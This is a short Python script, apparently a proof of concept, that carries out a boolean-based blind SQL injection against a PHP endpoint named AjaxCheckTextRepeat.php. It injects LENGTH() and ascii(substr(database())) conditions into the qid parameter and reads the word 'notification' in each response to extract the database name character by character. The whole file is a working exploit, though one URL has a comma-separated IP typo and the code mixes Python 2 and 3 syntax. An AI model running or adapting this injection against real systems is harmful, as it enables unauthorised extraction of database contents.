import requests
import re
import time

def getDBName(DBName_len):
    DBName = ""
    url_template = "http://127,0,0,1/JS/AjaxCheckTextRepeat.php?qid=140%20where%201%20and%20(ascii(substr(database(),{0},1)))={1}%23&hash=23*1*2|"  
    chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz@.#!?'  
    print("Start to retrieve datas...")

    for i in range( 1, DBName_len + 1):
        print("Number of letter: " , i)
        tempDBName = DBName
        for char in chars:
            print("Test letter " + char)
            char_ascii = ord(char)
            url = url_template.format(i, char_ascii)

            response = requests.get(url)
            pattern = re.compile(r'notification')
            match = pattern.search(response.text)

            if match:
                DBName += char
                #print("DBName is: " + DBName + "...")
                break
            time.sleep(0.1)
        print DBName

def getlenth(): 
    lenth = ""
    string_to_test = "database()" 
    url_template = "http://127.0.0.1/JS/AjaxCheckTextRepeat.php?qid=140%20where%201%20and%20LENGTH("+string_to_test+")={0}%23&hash=23*1*2|"
    #print url_template
    #exit() 
    print("Start to retrieve lenth...")  

    for i in range(1, 100):
        print("Number of lenth: " , i)
        url = url_template.format(i)
        #print url
        #exit()
        response = requests.get(url)
        pattern = re.compile(r'notification')
        match = pattern.search(response.text)
        if match:
            print("lenth is: " + str(i))
            return i
            break
        time.sleep(0.1)

lenth = getlenth()
getDBName(lenth)
